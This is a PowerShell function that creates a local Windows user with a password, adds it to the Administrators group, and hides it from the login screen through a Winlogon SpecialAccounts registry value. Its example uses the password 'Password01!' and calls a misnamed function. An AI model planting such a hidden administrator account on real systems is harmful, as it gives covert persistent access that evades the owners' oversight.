Function New-OSCHiddenAccount
{
<#
 	.SYNOPSIS
        New-OSCHiddenAccount is an advanced function which can be create a hidden user account with administrative privileges.
    .DESCRIPTION
        New-OSCHiddenAccount is an advanced function which can be create a hidden user account with administrative privileges.
    .PARAMETER  UserName
		Specifies the user name for the local user account.
	.PARAMETER	Password
		Specifies the passowrd for the local user account.
	.PARAMETER  Description
		Specifies the description for the local user account.
	.PARAMETER  PasswordExpired
		Sets the expiration of passwords for the local user account.
	.EXAMPLE
        C:\PS> New-OSCAccount -UserName "HiddenAccount" -Password "Password01!" -Description "Hidden Account"
		
		This command shows how to create a hidden user account with administrative privileges.	
#>
	[CmdletBinding()]
	Param
	(
		[Parameter(Mandatory=$true)]
		[String]$UserName,
		[Parameter(Mandatory=$true)]
		[String]$Password,
		[Parameter(Mandatory=$false)]
		[String]$Description,
		[Parameter(Mandatory=$false)]
		#The default value of Passwordexpired is set 1,it means that users don't have to change their password.
		[Int]$PasswordExpired
	)
	
	Try
	{
		$ComputerName = $env:COMPUTERNAME
		#create a user account
		$objOu = [ADSI]"WinNT://$ComputerName"
		$objUser = $objOU.Create("User", $UserName)
		#set password
		$objUser.SetPassword($Password)
		$objUser.SetInfo()
		
		#set whether the user need to change the password
		If($PasswordExpired -gt 0)
		{
			$objUser.PasswordExpired = $PasswordExpired
			$objUser.SetInfo()
		}
		Else
		{
			$objUser.PasswordExpired = 0
			$objUser.SetInfo()
		}
		
		#set description
		If($Description -gt 0)
		{
			$objUser.Description = $Description
			$objUser.SetInfo()
		}
		
		#set local group membership
		$LocalGroup = [ADSI]"WinNT://$ComputerName/Administrators"
		$UserAccount = [ADSI]"WinNT://$ComputerName/$UserName"
		$LocalGroup.Add($UserAccount.Path)
		$LocalGroup.SetInfo()
		
		#setting registry key
		$KeyPath = "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
		New-Item -Path "$KeyPath" -Name SpecialAccounts | Out-Null
		New-Item -Path "$KeyPath\SpecialAccounts" -Name UserList | Out-Null
		New-ItemProperty -Path "$KeyPath\SpecialAccounts\UserList" -Name $UserName -Value 0 -PropertyType DWord | Out-Null
		
		Write-Host "Account has been successfully created." -ForegroundColor Green
	}
	Catch
	{
		Write-Host "Account creation failed." -ForegroundColor Red
	}
}